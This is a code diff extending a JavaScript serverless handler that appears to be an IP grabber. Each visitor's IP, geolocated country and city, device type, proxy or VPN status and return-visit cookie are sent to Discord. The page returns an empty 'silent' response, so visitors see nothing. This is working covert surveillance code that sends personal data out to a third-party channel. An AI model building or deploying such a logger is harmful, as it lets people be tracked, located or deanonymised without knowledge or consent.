@@ -14,10 +14,17 @@ async function getCountryFromIP(ip){
     const d = await r.json();
     return {
       country: d.country_name || "Unknown",
-      code: d.country_code || "??"
+      city: d.city || "Unknown",
+      code: d.country_code || "??",
+      proxy: d.proxy || d.vpn || false
     };
   }catch{
-    return { country: "Unknown", code: "??" };
+    return {
+      country: "Unknown",
+      city: "Unknown",
+      code: "??",
+      proxy: false
+    };
   }
 }
 
@@ -25,9 +32,31 @@ export default async function handler(req, res){
 
   const ip =
     req.headers["x-forwarded-for"]?.split(",")[0] ||
-    req.socket.remoteAddress;
+    req.socket.remoteAddress ||
+    "Unknown";
+
+  const userAgent = req.headers["user-agent"] || "Unknown";
+
+  const isMobile = /mobile|android|iphone|ipad/i.test(userAgent)
+    ? "Mobile"
+    : "Desktop";
 
   const location = await getCountryFromIP(ip);
+
+  // Basic proxy/VPN detection via headers
+  const proxyHeaders = [
+    "x-forwarded-for",
+    "x-real-ip",
+    "via",
+    "forwarded"
+  ];
+  const isProxy =
+    location.proxy ||
+    proxyHeaders.some(h => req.headers[h]);
+
+  // First visit / returning visitor (cookie-based)
+  const cookies = req.headers.cookie || "";
+  const isReturning = cookies.includes("visited=true");
 
   await sendToDiscord({
     embeds: [{
@@ -41,17 +70,15 @@ export default async function handler(req, res){
         { name: "🚩 Proxy / VPN", value: isProxy ? "Yes" : "No", inline: true },
         { name: "🧭 Visitor", value: isReturning ? "Returning" : "First Visit", inline: true },
         { name: "🕒 Time", value: new Date().toLocaleString(), inline: false }
-
       ]
     }]
   });
 
-// set cookie silently for return detection
+  // set cookie silently for return detection
   res.setHeader(
     "Set-Cookie",
     "visited=true; Path=/; Max-Age=31536000; SameSite=Lax"
   );
-
 
   // no content response (fast & silent)
   res.status(204).end();
